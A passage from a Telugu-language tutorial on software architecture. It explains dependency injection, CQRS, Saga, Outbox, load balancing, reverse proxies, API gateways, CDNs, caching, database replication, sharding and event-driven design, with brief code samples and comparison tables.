- **Why it's needed:** మీరు సర్వీస్-ఏ (Service A) లోపల `const db = new Database()` అని రాస్తే, రేపు ఆ డిబిని మార్చడం కష్టం. అదే `constructor(db) { this.db = db }` అని ఇంజెక్ట్ చేస్తే... టెస్టింగ్ చేసేటప్పుడు ఒరిజినల్ డిబికి బదులు నకిలీ డిబిని పంపి సులభంగా టెస్ట్ చేయవచ్చు.

```javascript
// కన్స్ట్రక్టర్ లోనే డిపెండెన్సీ ని ఇంజెక్ట్ చేస్తున్నాం
class UserService {
  constructor(userRepository) {
    this.userRepository = userRepository; // ఇంజెక్ట్ చేయబడింది
  }
  getUser(id) {
    return this.userRepository.findById(id);
  }
}
```

---

### 📌 క్విక్ సమ్మరీ:

| ప్యాటర్న్                | దేని కోసం?                      | ముఖ్యమైన లాభం                               |
| ------------------------ | ------------------------------- | ------------------------------------------- |
| **Decorator**            | ఫీచర్లను యాడ్ చేయడం             | కోడ్ మార్చకుండా కొత్త బిహేవియర్ యాడ్ చేయడం. |
| **Repository**           | డేటాబేస్ లాజిక్ సెపరేషన్        | డేటాబేస్ మార్చినా కోడ్ పాడవదు.              |
| **Dependency Injection** | ఆబ్జెక్ట్స్ ని బయట నుండి ఇవ్వడం | టెస్టింగ్ చేయడం చాలా సులభం అవుతుంది.        |

---

ఒక సిస్టమ్ స్కేల్ అవుతున్నప్పుడు (Microservices లో), డేటా కన్సిస్టెన్సీ (Data Consistency) మరియు పర్ఫార్మెన్స్ సమస్యలను ఎదుర్కోవడానికి ఇండస్ట్రీలో వాడే అత్యంత పవర్‌ఫుల్ **Distributed Architecture Patterns** ఇవి.

వీటిని కూడా మన స్టైల్‌లో సింపుల్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. CQRS (Command Query Responsibility Segregation)

- **The Core Concept:** అప్లికేషన్ లో డేటాని మార్చే పనిని (Commands: Create, Update, Delete) మరియు డేటాని చదివే పనిని (Queries: Read) వేర్వేరుగా విభజించడం.
- **Why it's needed:** సాధారణంగా ఒకే క్లాస్, ఒకే డేటాబేస్ టేబుల్ రెండింటినీ హ్యాండిల్ చేస్తాయి. కానీ పర్ఫార్మెన్స్ కావాలంటే రీడ్/రైట్ ఆపరేషన్స్ వేరుగా ఉండాలి.
- **How it works:**
- **Command Side:** యూజర్ డేటాని మార్చినప్పుడు, అది ఒక పద్ధతిలో డేటాబేస్‌కి వెళ్తుంది.
- **Query Side:** రీడ్ చేసేటప్పుడు డేటాబేస్ నుండి నేరుగా కాకుండా, వేగంగా డేటా వచ్చే ఒక "రీడ్ మోడల్" (Read-only database like Elasticsearch or Redis) నుండి వస్తుంది.

- **Benefit:** రీడ్ సైడ్ ని మనం ఎంతైనా స్కేల్ చేయవచ్చు (Read Replicas), దీనివల్ల రైటింగ్ ఆపరేషన్స్ స్లో అవ్వవు.

---

## 2. Saga Pattern (Distributed Transactions)

- **The Core Concept:** మైక్రోసర్వీసెస్ ఆర్కిటెక్చర్‌లో, ఒకే పని కోసం వేర్వేరు సర్వీసెస్ (ఉదా: Order Service, Payment Service, Inventory Service) మీద ఆధారపడతాం. ఒక సర్వీస్ ఫెయిల్ అయితే, మిగతా సర్వీసెస్ లో జరిగిన మార్పులను ఎలా వెనక్కి తీసుకోవాలి (Rollback) అని చెప్పే ప్యాటర్న్ ఇది.
- **Why it's needed:** మైక్రోసర్వీసెస్ లో డేటాబేస్లు వేరువేరుగా ఉంటాయి కాబట్టి, మామూలు `BEGIN TRANSACTION` పనిచేయదు.
- **How it works (Two ways):**

1. **Choreography (ఈవెంట్ ఆధారంగా):** ఒక్కో సర్వీస్ తన పని పూర్తి చేసి ఒక ఈవెంట్ ని పంపిస్తుంది. తర్వాతి సర్వీస్ దాన్ని విని పని మొదలుపెడుతుంది. (ఉదా: Payment Success ఈవెంట్ రాగానే Inventory సర్వీస్ ఐటమ్స్ ని డిక్రీజ్ చేస్తుంది).
2. **Orchestration (మేనేజర్ ఆధారంగా):** ఒక "Saga Orchestrator" (మేనేజర్) ఉంటుంది. అది అన్ని సర్వీసులను పర్యవేక్షిస్తుంది. ఏదైనా ఫెయిల్ అయితే, అది వెంటనే **Compensating Transactions** (నష్టపరిహార చర్యలు - అంటే పాత డేటాను రిస్టోర్ చేయడం) రన్ చేస్తుంది.

---

## 3. Outbox Pattern (డేటాబేస్ & మెసేజ్ క్యూ సింక్)

- **The Core Concept:** డేటాబేస్ లో ఒక రికార్డ్ సేవ్ అవ్వడం మరియు దాని గురించి మిగతా సర్వీసులకు తెలియజేయడం (Message Queue కి పంపడం) అనేవి ఒకేసారి (Atomically) జరగాలి.
- **The Problem (Dual Write Problem):** సర్వీస్ లో డేటాబేస్ కి సేవ్ అయ్యాక, క్యూకి మెసేజ్ పంపే లోపు సర్వర్ క్రాష్ అయితే? క్యూకి మెసేజ్ వెళ్ళదు, సిస్టమ్ అప్‌డేట్ అవ్వదు.
- **The Fix (Outbox):**

1. సర్వీస్ డేటాబేస్ లో ఒకే ట్రాన్సాక్షన్ లో—డేటా సేవ్ చేయడం + అదే డేటాబేస్ లో ఒక `Outbox` టేబుల్‌లో మెసేజ్ ని కూడా సేవ్ చేయడం.
2. ఒక బ్యాక్‌గ్రౌండ్ ప్రోగ్రామ్ (`Message Relay`) ఆ `Outbox` టేబుల్ లోని డేటాని మెసేజ్ క్యూకి పంపుతుంది. దీనివల్ల ఏ మెసేజ్ మిస్ అవ్వదు.

---

### 📌 సమ్మరీ:

| ప్యాటర్న్  | దేని కోసం?                           | ఎప్పుడు వాడాలి?                                         |
| ---------- | ------------------------------------ | ------------------------------------------------------- |
| **CQRS**   | పర్ఫార్మెన్స్ (రీడ్/రైట్ వేరు చేయడం) | రీడ్ ట్రాఫిక్ చాలా ఎక్కువ ఉన్నప్పుడు.                   |
| **Saga**   | ట్రాన్సాక్షన్ మేనేజ్‌మెంట్           | మల్టిపుల్ సర్వీసెస్ మధ్య ట్రాన్సాక్షన్ జరిగినప్పుడు.    |
| **Outbox** | డేటా కన్సిస్టెన్సీ                   | డేటాబేస్ మరియు క్యూ మధ్య డేటా లాస్ అవ్వకుండా ఉండటానికి. |

---

# 16: System Design Patterns

సిస్టమ్ డిజైన్ (System Design) లో ఒక అప్లికేషన్ మిలియన్ల మంది యూజర్లను హ్యాండిల్ చేయాలంటే, కేవలం ఒక సర్వర్ సరిపోదు. ఆ భారాన్ని సర్వర్ల మధ్య పంచుతూ, సిస్టమ్‌ని సెక్యూర్ గా ఉంచడానికి వాడే **Load Balancer** మరియు **Reverse Proxy** అనేవి ఆర్కిటెక్చర్ లోని రెండు ప్రధాన స్తంభాలు.

వీటిని మన స్టైల్‌లో సింపుల్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. Load Balancer (భారాన్ని పంచుకునే కంట్రోలర్)

- **The Core Concept:** ట్రాఫిక్ ఎక్కువగా ఉన్నప్పుడు, ఒకే సర్వర్ మీద భారం వేయకుండా... మన దగ్గర ఉన్న బహుళ సర్వర్ల (Server Farm/Cluster) మధ్య ఆ ట్రాఫిక్‌ని సమానంగా పంచే మెకానిజమే **Load Balancer**.
- **Why it's needed:** ఒక సర్వర్ సెకనుకి 1,000 రిక్వెస్టులు మాత్రమే హ్యాండిల్ చేయగలదు అనుకుందాం. యూజర్లు 10,000 వస్తే? అప్పుడు లోడ్ బ్యాలెన్సర్ ఆ 10,000 రిక్వెస్ట్‌లను 10 సర్వర్లకు పంచుతుంది. దీనివల్ల ఏ సర్వర్ కూడా క్రాష్ అవ్వదు.

### ⚙️ Load Balancing Algorithms (ఎలా పంచుతుంది?):

1. **Round Robin:** ఒకరి తర్వాత ఒకరికి (1, 2, 3, 1, 2, 3...) వరుసగా రిక్వెస్ట్‌లను పంపుతుంది.
2. **Least Connections:** ఏ సర్వర్‌కి ప్రస్తుతం కనెక్షన్లు తక్కువగా ఉన్నాయో, దానికే కొత్త రిక్వెస్ట్‌ని పంపుతుంది.
3. **IP Hash:** యూజర్ యొక్క IP అడ్రస్‌ని బట్టి ఎప్పుడూ ఒకే సర్వర్‌కి పంపేలా చేస్తుంది (దీన్నే **Sticky Sessions** అంటారు, ఇది లాగిన్ అయిన యూజర్లకు బాగా పనిచేస్తుంది).

---

## 2. Reverse Proxy (మధ్యవర్తి/గేట్‌వే)

- **The Core Concept:** క్లయింట్ (యూజర్) మరియు మన వెనుక ఉండే సర్వర్ల (Backend Servers) మధ్య ఉండే ఒక మధ్యవర్తి. బయటి ప్రపంచానికి మనం ఏ సర్వర్ వాడుతున్నామో, మన సర్వర్ ఐపీ ఏంటో తెలియనివ్వదు.
- **The Analogy:** ఒక పెద్ద ఆఫీస్ కి మీరు వెళ్లారు. అక్కడ రిసెప్షనిస్ట్ (Reverse Proxy) ఉంటారు. మీరు అడ్రస్ అడగగానే, లోపల ఉన్న ఏ మేనేజరో మీకు తెలియదు, ఆ రిసెప్షనిస్టే లోపల వారితో మాట్లాడి సమాచారం తెచ్చి మీకు ఇస్తారు. మీకూ, ఆ మేనేజర్‌కి మధ్య రిసెప్షనిస్ట్ ఒక తెరలా ఉంటారు.

### 🛡️ Reverse Proxy ఎందుకు వాడాలి? (Superpowers)

1. **Security:** బయటి హ్యాకర్లకు మన ఇంటర్నల్ సర్వర్ల ఐపీలు కనిపించవు. రివర్స్ ప్రాక్సీ మాత్రమే కనిపిస్తుంది.
2. **SSL Termination:** క్లయింట్ మరియు ప్రాక్సీ మధ్య ఉన్న డేటాని ఎన్‌క్రిప్ట్ (HTTPS) చేయడం, ప్రాక్సీ నుండి సర్వర్ కి డేటాని నార్మల్ గా పంపడం. దీనివల్ల సర్వర్ల మీద ఎన్‌క్రిప్షన్ భారం తగ్గుతుంది.
3. **Caching:** ఒకే డేటాని చాలా మంది అడిగితే, సర్వర్ వరకు వెళ్ళకుండా ప్రాక్సీ దగ్గరే డేటాని సేవ్ చేసి (Cache) వెంటనే ఇచ్చేస్తుంది.
4. **Compression:** రిక్వెస్ట్/రెస్పాన్స్ లను కంప్రెస్ చేయడం (Gzip/Brotli) కూడా ఇక్కడే జరుగుతుంది.

---

## 📌 క్విక్ కంపారిజన్ (తేడా ఏంటి?):

| ఫీచర్              | Load Balancer                                 | Reverse Proxy                                              |
| ------------------ | --------------------------------------------- | ---------------------------------------------------------- |
| **ప్రధాన లక్ష్యం** | ట్రాఫిక్ ని పంచుతూ సిస్టమ్ ని స్కేల్ చేయడం.   | సెక్యూరిటీ, క్యాషింగ్, మరియు కమ్యూనికేషన్ హ్యాండిల్ చేయడం. |
| **పనితీరు**        | మల్టిపుల్ సర్వర్ల మధ్య డేటాని పంచుతుంది.      | సర్వర్ల ముందు ఒక గేట్‌వే లాగా ఉంటుంది.                     |
| **ఇంటర్నెట్ లో**   | దీనివల్ల సిస్టమ్ ఆగిపోదు (High Availability). | దీనివల్ల సర్వర్లు దాచబడతాయి (Security).                    |

- **గమనిక:** నిజా నిజానికి చాలా టూల్స్ ఈ రెండింటినీ చేస్తాయి. ఉదాహరణకు **Nginx** ఒక పవర్‌ఫుల్ రివర్స్ ప్రాక్సీ, అదే టైంలో అది ఒక అద్భుతమైన లోడ్ బ్యాలెన్సర్ కూడా. అలాగే **AWS ELB (Elastic Load Balancer)** మరియు **CloudFront** లు కూడా ఈ రెండింటి కాంబినేషన్ లా పనిచేస్తాయి.

---

సిస్టమ్ డిజైన్ (System Design) లో ఒక అప్లికేషన్ వెబ్ ప్రపంచంలోకి ఎంట్రీ ఇచ్చేటప్పుడు, అది ఎంత వేగంగా ఉండాలి మరియు ఎంత సెక్యూర్ గా ఉండాలి అనేది **API Gateway** మరియు **CDN** డిసైడ్ చేస్తాయి. వీటి గురించి ఇప్పుడు డీటెయిల్డ్‌గా చూద్దాం.

---

## 1. API Gateway (మైక్రోసర్వీసెస్ గేట్‌వే)

- **The Core Concept:** మీ అప్లికేషన్‌లో 50 మైక్రోసర్వీసెస్ ఉన్నాయి అనుకుందాం. యూజర్ ప్రతి సర్వీస్‌ని విడివిడిగా కాల్ చేయకుండా, అన్నిటికీ కలిపి ఒకే ఒక్క ఎంట్రీ పాయింట్ (Entry Point) ఉంటే దాన్నే **API Gateway** అంటాం.
- **Why it's needed:** మైక్రోసర్వీసెస్ వాడేటప్పుడు క్లయింట్ కి ఇన్ని వందల ఐపీలు గుర్తుండవు. ఈ గేట్‌వే ద్వారా క్లయింట్ ఒకే కాల్ పంపిస్తే, అది ఏ సర్వీస్‌కి వెళ్లాలో గేట్‌వే నిర్ణయిస్తుంది.

### 🛡️ API Gateway యొక్క సూపర్ పవర్స్:

1. **Authentication/Authorization:** ప్రతి మైక్రోసర్వీస్ లో అథెంటికేషన్ రాయక్కర్లేదు. యూజర్ టోకెన్ (JWT) ని గేట్‌వే లెవెల్ లోనే వెరిఫై చేసి, చెల్లని టోకెన్ అయితే అక్కడే రిజెక్ట్ చేస్తుంది.
2. **Rate Limiting:** ఒకే యూజర్ సెకనుకి 1000 కాల్స్ చేసి మన సిస్టమ్ ని క్రాష్ చేయకుండా (DDoS), "నువ్వు సెకనుకి 10 మాత్రమే చేయగలవు" అని లిమిట్ పెడుతుంది.
3. **Request Routing:** `api.myapp.com/users` అంటే యూజర్ సర్వీస్‌కి, `/orders` అంటే ఆర్డర్ సర్వీస్‌కి పంపుతుంది.
4. **Protocol Translation:** క్లయింట్ (Browser) వాడే HTTP ని, లోపల సర్వీసెస్ వాడే GRPC కి మార్చగలదు.

---

## 2. CDN (Content Delivery Network - వేగవంతమైన డెలివరీ)

- **The Core Concept:** మీ సర్వర్ ఇండియాలో ఉంది అనుకుందాం, కానీ యూజర్ అమెరికాలో ఉండి మీ సైట్ చూస్తున్నాడు. డేటా ఇండియా నుండి అమెరికాకు వెళ్లడానికి టైమ్ పడుతుంది కదా! అందుకే, మీ సైట్‌లోని స్టాటిక్ ఫైల్స్ (Images, CSS, JS, Videos) అన్నింటినీ ప్రపంచవ్యాప్తంగా ఉన్న వేలాది **Edge Servers (PoPs - Points of Presence)** లో కాపీ చేసి ఉంచడాన్నే **CDN** అంటారు.
- **Why it's needed:** యూజర్ అమెరికా నుండి రిక్వెస్ట్ పంపగానే, మీ ఇండియా సర్వర్ వరకు రాకుండా, అమెరికాలోని దగ్గరగా ఉన్న ఒక CDN సర్వర్ నుండి ఆ ఫైల్స్ వస్తాయి. దీనివల్ల లోడింగ్ టైమ్ మిల్లీసెకన్లలోకి తగ్గిపోతుంది.

### ⚙️ CDN ఎలా పనిచేస్తుంది?

1. యూజర్ ఒక ఫైల్ కోసం రిక్వెస్ట్ పంపుతాడు.
2. దగ్గరలోని CDN సర్వర్ లో ఆ ఫైల్ ఉందో లేదో చూస్తుంది (**Cache Hit**). ఉంటే వెంటనే ఇచ్చేస్తుంది.
3. లేకపోతే (**Cache Miss**), మీ ఒరిజినల్ సర్వర్ (Origin Server) దగ్గరికి వెళ్లి డేటా తెచ్చుకుని, ఒక కాపీ తన దగ్గర దాచుకుని యూజర్‌కి పంపుతుంది.

- **Popular CDNs:** Cloudflare, AWS CloudFront, Akamai.

---

## 📌 క్విక్ కంపారిజన్ (తేడా ఏంటి?):

| ఫీచర్                       | API Gateway                                | CDN                                                  |
| --------------------------- | ------------------------------------------ | ---------------------------------------------------- |
| **ప్రధాన ఉద్దేశ్యం**        | మైక్రోసర్వీసెస్ మేనేజ్‌మెంట్ & సెక్యూరిటీ. | వెబ్ కంటెంట్ ని వేగంగా లోడ్ చేయడం.                   |
| **ఏం హ్యాండిల్ చేస్తుంది?** | డైనమిక్ డేటా (API Calls, DB Queries).      | స్టాటిక్ ఫైల్స్ (Images, CSS, Videos, JS).           |
| **ఎక్కడ ఉంటుంది?**          | మీ సర్వర్ల ముందు (Entry Point).            | ప్రపంచవ్యాప్తంగా ఉన్న నెట్‌వర్క్ ఎడ్జెస్ లో (Edges). |

---

### 📌 ఆర్కిటెక్చరల్ ఫ్లో:

ఒక యూజర్ వెబ్‌సైట్ ఓపెన్ చేస్తే:

1. బ్రౌజర్ CDN కి వెళ్లి CSS, JS ఇమేజ్ లు తెచ్చుకుంటుంది (**సూపర్ ఫాస్ట్**).
2. బ్రౌజర్ API కాల్ (ఉదా: లాగిన్/ప్రొడక్ట్స్) పంపితే, అది **API Gateway** కి వెళ్తుంది.
3. API Gateway అథెంటికేషన్ చెక్ చేసి, కరెక్ట్ సర్వీస్‌కి పంపుతుంది.

---

సిస్టమ్ డిజైన్ (System Design) లో పర్ఫార్మెన్స్‌ను మల్టిప్లై చేయడానికి మరియు డేటాను సురక్షితంగా ఉంచడానికి వాడే రెండు అత్యంత శక్తివంతమైన అస్త్రాలు **Cache** మరియు **Database Replication**. వీటి గురించి ఇప్పుడు క్లియర్‌గా చూద్దాం.

---

## 1. Cache (సూపర్ ఫాస్ట్ మెమరీ)

- **The Core Concept:** తరచుగా అడిగే డేటాను (Frequently accessed data) ప్రతిసారీ డేటాబేస్ నుండి తెచ్చుకోకుండా, రామ్ (RAM) లోనే ఒక కాపీని దాచుకోవడమే **Cache**.
- **Why it's needed:** డేటాబేస్ లోని డేటాను వెతకడం (Disk I/O) చాలా నెమ్మదిగా ఉంటుంది, కానీ రామ్ లో డేటాను చదవడం (Memory Access) వేల రెట్లు వేగంగా ఉంటుంది.

### ⚙️ క్యాషింగ్ స్ట్రాటజీలు (ఎలా దాచుకోవాలి?):

1. **Cache Aside (Lazy Loading):** అప్లికేషన్ ముందు క్యాషీలో వెతుకుతుంది, లేకపోతే డేటాబేస్ నుండి తెచ్చి క్యాషీలో సేవ్ చేస్తుంది. ఇది మోస్ట్ పాపులర్.
2. **Write Through:** డేటాబేస్ లో డేటా అప్‌డేట్ అవ్వగానే, వెంటనే క్యాషీని కూడా అప్‌డేట్ చేస్తుంది. డేటా ఎప్పుడూ లేటెస్ట్‌గా ఉంటుంది.
3. **Eviction Policies (క్యాషీ నిండిపోతే ఏం చేయాలి?):** \* **LRU (Least Recently Used):** చాలా కాలంగా వాడని డేటాను తీసేస్తుంది. ఇది చాలా ప్రాచుర్యం పొందింది.

- **LFU (Least Frequently Used):** తక్కువ సార్లు వాడిన డేటాను తీసేస్తుంది.

- **Popular Tools:** Redis, Memcached.

---

## 2. Database Replication (డేటా కాపీలు)

- **The Core Concept:** ఒకే డేటాబేస్‌పై లోడ్ పడకుండా, డేటాను ఒకటి కంటే ఎక్కువ డేటాబేస్ సర్వర్లలోకి కాపీ (Replicate) చేయడాన్నే **Database Replication** అంటారు.
- **Why it's needed:** ఒకే సర్వర్ ఉంటే అది క్రాష్ అయినా లేదా లోడ్ పెరిగినా సిస్టమ్ ఆగిపోతుంది. రిప్లికేషన్ వల్ల డేటా సేఫ్ గా ఉంటుంది మరియు రీడ్ పర్ఫార్మెన్స్ పెరుగుతుంది.

### ⚙️ రిప్లికేషన్ టైప్స్:

1. **Master-Slave Replication:**

- **Master (Primary):** అన్ని రైట్ (Write - Insert, Update, Delete) ఆపరేషన్స్ ఇక్కడే జరుగుతాయి.
- **Slaves (Read Replicas):** మాస్టర్ నుండి డేటాను కాపీ చేసుకుంటాయి. యూజర్ రీడ్ (Read - Select) ఆపరేషన్స్ అన్నీ వీటి ద్వారా జరుగుతాయి.
- **Benefit:** రైటింగ్ ఒకదానిపై, రీడింగ్ పదుల కొద్దీ సర్వర్ల మీద జరపొచ్చు (Read Scaling).

2. **Multi-Master Replication:** అన్ని సర్వర్లు రైట్ మరియు రీడ్ రెండింటినీ చేయగలవు. ఇది కాంప్లెక్స్ కానీ హై-అవైలబిలిటీకి బెస్ట్.

---

## 📌 క్విక్ కంపారిజన్:

| ఫీచర్                   | Cache                              | Database Replication                   |
| ----------------------- | ---------------------------------- | -------------------------------------- |
| **ప్రధాన లక్ష్యం**      | వేగం (Latency తగ్గించడం).          | భద్రత (Availability) & రీడ్ స్కేలింగ్. |
| **డేటా ఎక్కడ ఉంటుంది?** | RAM (తాత్కాలికం).                  | Disk (శాశ్వతం).                        |
| **డేటా లాస్**           | క్యాషీ క్లియర్ అయితే డేటా పోతుంది. | మాస్టర్ లో ఉంటుంది కాబట్టి డేటా పోదు.  |
| **పనితీరు**             | కొన్ని మిల్లీసెకన్ల వేగం.          | రీడ్ ట్రాఫిక్ ని పంచుతుంది.            |

---

### 📌 ఆర్కిటెక్చరల్ టిప్:

ఒక పర్ఫెక్ట్ సిస్టమ్ ఎలా ఉంటుందంటే:

- యూజర్ ఒక రిక్వెస్ట్ పంపితే ముందు అది **Cache (Redis)** ని చూస్తుంది. అక్కడ లేకపోతేనే **Database (Replicas)** కి వెళ్తుంది.
- డేటాబేస్ లో మార్పులు జరిగినప్పుడు, రిప్లికేషన్ ద్వారా ఇతర సర్వర్లకి అప్‌డేట్ అవుతుంది.

---

డేటాబేస్ మేనేజ్‌మెంట్ మరియు స్కేలబిలిటీలో ఇవి అత్యంత అడ్వాన్స్‌డ్ టాపిక్స్. ఒకే డేటాబేస్ సర్వర్ లో కోట్లాది రికార్డులను మేనేజ్ చేయడం కష్టమైనప్పుడు (స్టోరేజ్ లేదా పర్ఫార్మెన్స్ సమస్యలు), మనం వాడే టెక్నిక్సే ఈ **Partitioning** మరియు **Sharding**.

వీటిని మన స్టైల్‌లో సింపుల్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. Database Partitioning (ఒకే డేటాబేస్, ముక్కలు ముక్కలు)

- **The Core Concept:** ఒకే పెద్ద టేబుల్‌ని (Table) చిన్న చిన్న ముక్కలుగా విభజించి, ఒకే డేటాబేస్ లోని వేర్వేరు ఫిజికల్ లొకేషన్లలో సేవ్ చేయడాన్నే **Partitioning** అంటారు.
- **Why it's needed:** ఒక టేబుల్‌లో 10 ఏళ్ల డేటా ఉందనుకోండి. మనం ఎక్కువగా వాడేది ప్రస్తుత ఏడాది డేటాయే. పాత డేటా కోసం సర్వర్ మొత్తం సెర్చ్ చేయకుండా, కేవలం ఆ ఇయర్ కి సంబంధించిన పార్టిషన్ లో మాత్రమే వెతికేలా చేయడానికి ఇది ఉపయోగపడుతుంది.
- **Types of Partitioning:**
- **Horizontal Partitioning (Range/List):** రికార్డులను రోస్ (Rows) వారీగా విభజించడం. (ఉదా: 2024 డేటా ఒక పార్టిషన్, 2025 డేటా మరో పార్టిషన్).
- **Vertical Partitioning:** టేబుల్ కాలమ్స్ (Columns) ని విభజించడం. (ఉదా: యూజర్ ప్రొఫైల్ లోని 'Name, Email' ఒక టేబుల్ లో, 'Profile Bio, Bio-data' మరో టేబుల్ లో).

---

## 2. Database Sharding (ఒకే డేటాబేస్, వేర్వేరు సర్వర్లు)

- **The Core Concept:** పార్టిషనింగ్ లో డేటాను ఒకే సర్వర్ లో ముక్కలు చేస్తాం. కానీ **Sharding** లో డేటాను ముక్కలు చేసి, వాటిని **వేర్వేరు సర్వర్లలో (Different physical machines/servers)** సేవ్ చేస్తాం. దీన్నే "Horizontal Scaling" అంటారు.
- **Why it's needed:** ఒక సర్వర్ లో స్టోరేజ్ (RAM/Disk) అయిపోయినప్పుడు, మరో సర్వర్ ని యాడ్ చేసి డేటాని స్ప్రెడ్ చేయడం.
- **How it works (Sharding Key):** ప్రతి డేటాని ఏ షార్డ్ (సర్వర్) కి పంపాలో నిర్ణయించడానికి ఒక **Shard Key** ని వాడుతాము.
- **Hash Sharding:** `UserID % 4` అని చేస్తే వచ్చే నంబర్ ని బట్టి 4 సర్వర్లలో ఒకదానికి పంపిస్తుంది.
- **Range Sharding:** A-M వరకు ఒక సర్వర్, N-Z వరకు మరో సర్వర్.

---

## 📌 క్విక్ కంపారిజన్:

| ఫీచర్                | Partitioning                       | Sharding                                        |
| -------------------- | ---------------------------------- | ----------------------------------------------- |
| **ఎక్కడ?**           | ఒకే సర్వర్ (Logical separation).   | వేర్వేరు సర్వర్లు (Physical separation).        |
| **మెయిన్ ఉద్దేశ్యం** | క్వెరీ పర్ఫార్మెన్స్ పెంచడం.       | డేటా స్కేలబిలిటీ మరియు స్టోరేజ్ పెంచడం.         |
| **కాంప్లెక్సిటీ**    | తక్కువ (సిస్టమ్ లోపలే జరుగుతుంది). | చాలా ఎక్కువ (మల్టిపుల్ సర్వర్స్ మేనేజ్ చేయాలి). |

---

### ⚠️ Sharding లో ఉండే సవాళ్లు (Challenges):

1. **Joins:** వేర్వేరు సర్వర్లలో ఉన్న డేటాతో `JOIN` క్వెరీ రాయడం చాలా కష్టం మరియు స్లో.
2. **Rebalancing:** ఒక సర్వర్ నిండిపోయి మరో కొత్త సర్వర్ ని యాడ్ చేస్తే, పాత డేటాను మళ్ళీ రీ-డిస్ట్రిబ్యూట్ చేయాల్సి ఉంటుంది.
3. **Complex Logic:** ఏ సర్వర్‌లో ఏ డేటా ఉందో ట్రాక్ చేయడానికి ప్రత్యేకమైన లాజిక్ (Shard Manager) కావాలి.

### 📌 సమ్మరీ:

- డేటా తక్కువగా ఉన్నప్పుడు క్వెరీ స్పీడ్ కోసం **Partitioning** వాడండి.
- డేటా విపరీతంగా పెరిగిపోయి (పెటాబైట్స్), ఒక సర్వర్ సరిపోనప్పుడు **Sharding** కి వెళ్ళండి.

---

సిస్టమ్ డిజైన్ (System Design) లో ఒకే డేటాను నమ్మదగినదిగా ఉంచడానికి మరియు వేర్వేరు సర్వీసులను స్వతంత్రంగా నడపడానికి వాడే రెండు అద్భుతమైన ఆర్కిటెక్చర్ ప్యాటర్న్స్ ఇవి.

వీటిని కూడా మన స్టైల్‌లో క్లియర్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. Leader-Follower Pattern (మాస్టర్-స్లేవ్ కమ్యూనికేషన్)

- **The Core Concept:** ఇది ఒక **High Availability** ప్యాటర్న్. సిస్టమ్ లో ఉండే అన్ని సర్వర్లు సమానం కాదు. ఒక సర్వర్‌ని **"Leader" (మాస్టర్)** గా, మిగిలిన వాటిని **"Followers" (స్లేవ్స్/రిప్లికాస్)** గా నియమిస్తాం.
- **How it works:**
- **Writes:** ఏదైనా డేటాను మార్చాలన్నా (Write), క్లయింట్ కచ్చితంగా "Leader" కి మాత్రమే పంపుతాడు.
- **Reads:** రీడ్ (Read) ఆపరేషన్స్ అన్నీ "Followers" కి పంపవచ్చు. దీనివల్ల రీడ్ లోడ్ తగ్గుతుంది.
- **Data Sync:** లీడర్ దగ్గర జరిగిన మార్పులను నిరంతరం ఫాలోవర్స్ కాపీ చేసుకుంటాయి (Replication).

- **Failover:** ఒకవేళ "Leader" సర్వర్ క్రాష్ అయితే, మిగిలిన ఫాలోవర్లలో ఒకదాన్ని వెంటనే కొత్త లీడర్‌గా ఎన్నుకుంటాయి (Election). దీనినే **Leader Election** అంటారు.
- **Real-world Example:** **PostgreSQL/MySQL** డేటాబేస్ రిప్లికేషన్, **Apache Kafka** క్లస్టర్స్ లో ఈ ప్యాటర్న్ వాడతారు.

---

## 2. Event-Driven Architecture (EDA - సంఘటనల ఆధారిత వ్యవస్థ)

- **The Core Concept:** ఇది మైక్రోసర్వీసెస్ లో వాడే ఒక మోడరన్ ప్యాటర్న్. సర్వీస్-ఏ (Service A) కి, సర్వీస్-బి (Service B) నేరుగా కాల్ చేయదు. బదులుగా, సర్వీస్-ఏ ఏదైనా పని పూర్తి చేస్తే ఒక **"Event"** (సందేశం) ని వదులుతుంది. ఆ ఈవెంట్ ఎవరికి కావాలో వారు తీసుకుని తమ పని చేసుకుంటారు.
- **Why it's needed:** ఇది సర్వీసుల మధ్య **Loose Coupling** ని క్రియేట్ చేస్తుంది. సర్వీస్-ఏ కి సర్వీస్-బి ఎలా పనిచేస్తుందో తెలియక్కర్లేదు.

### ⚙️ EDA లో ఉండే 3 ప్రధాన భాగాలు:

1. **Producer:** ఈవెంట్‌ను క్రియేట్ చేసే సర్వీస్ (ఉదా: Order Service - "Order Created" అనే ఈవెంట్).
2. **Event Broker:** మధ్యలో ఉండే మెసేజ్ సిస్టమ్ (ఉదా: Kafka, RabbitMQ, AWS SQS). ఇది ఈవెంట్‌ను దాచిపెట్టి, అవసరమైన వారికి చేరవేస్తుంది.
3. **Consumer:** ఈవెంట్‌ను విని ఆ పనిని చేసే సర్వీస్ (ఉదా: Email Service, Inventory Service).

### 🚀 EDA వల్ల లాభాలు:

- **Scalability:** ఒక్క ఈవెంట్‌ను 10 సర్వీసెస్ వినవచ్చు. ఒక సర్వీస్ స్లో అయినా, అది మిగిలిన సర్వీసులపై ప్రభావం చూపదు.
- **Async Processing:** మెయిన్ సర్వీస్ యూజర్‌కి వెంటనే రెస్పాన్స్ ఇచ్చేస్తుంది (మనం ఆల్రెడీ చెప్పుకున్న Async Processing లాగే).

---

## 📌 క్విక్ కంపారిజన్ (తేడా ఏంటి?):

| ఫీచర్            | Leader-Follower                             | Event-Driven Architecture                         |
| ---------------- | ------------------------------------------- | ------------------------------------------------- |
| **లక్ష్యం**      | డేటా నిలకడ (Consistency) & అవైలబిలిటీ.      | సర్వీసుల మధ్య వేగం & ఇండిపెండెన్స్.               |
| **కమ్యూనికేషన్** | లీడర్ నుండి ఫాలోవర్ కి డేటా సింక్ అవుతుంది. | ప్రొడ్యూసర్ నుండి కన్స్యూమర్ కి ఈవెంట్ వెళ్తుంది. |
| **ఫెయిల్యూర్**   | లీడర్ పోతే ఎలక్షన్ జరగాలి.                  | బ్రోకర్ ఉంటే, సర్వీస్ డౌన్ అయినా డేటా పోదు.       |

---

### 📌 ఆర్కిటెక్చరల్ టిప్:

- మీ డేటాబేస్ డేటా సేఫ్ గా ఉండాలంటే **Leader-Follower** వాడండి.
- మీ మైక్రోసర్వీసెస్ అన్నీ ఒకదానిపై ఒకటి డిపెండ్ అవ్వకుండా ఇండిపెండెంట్ గా పనిచేయాలంటే **Event-Driven Architecture** వాడండి.

---

